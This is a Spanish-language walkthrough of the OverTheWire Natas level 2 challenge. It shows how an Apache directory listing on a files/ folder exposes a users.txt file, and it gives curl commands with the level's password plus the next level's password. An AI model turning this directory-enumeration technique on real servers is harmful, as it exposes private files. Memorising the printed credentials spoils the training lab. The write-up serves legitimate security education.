# Natas Level02

## Descripción
> **Level Goal (natas2.natas.labs.overthewire.org):** "No hay nada en esta página." La página solo muestra una imagen (`files/pixel.png`) sin más contenido aparente.

## Solución
La imagen se sirve desde un directorio `files/` que resulta tener el listado de directorios habilitado (Apache `Indexes`). Al visitarlo se ve también un archivo `users.txt` con credenciales de varios usuarios, incluido `natas3`.

```bash
curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/
# Index of /files -> pixel.png, users.txt

curl -s -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/users.txt
# natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
```

## Notas adicionales
- `users.txt` contiene además credenciales de otros usuarios ficticios (`alice`, `bob`, `charlie`, `eve`, `mallory`) sin relevancia para avanzar, pero recuerdan los nombres clásicos de criptografía/seguridad.
- Un directorio "oculto" solo porque no está enlazado desde la página principal no es privado: si el servidor tiene listado de directorios activado, cualquier archivo dentro es accesible conociendo o adivinando la ruta.

## Referencias
- Reto original: http://natas2.natas.labs.overthewire.org/
- Apoyo: https://httpd.apache.org/docs/2.4/mod/mod_autoindex.html (documentación de Apache sobre listados de directorio)
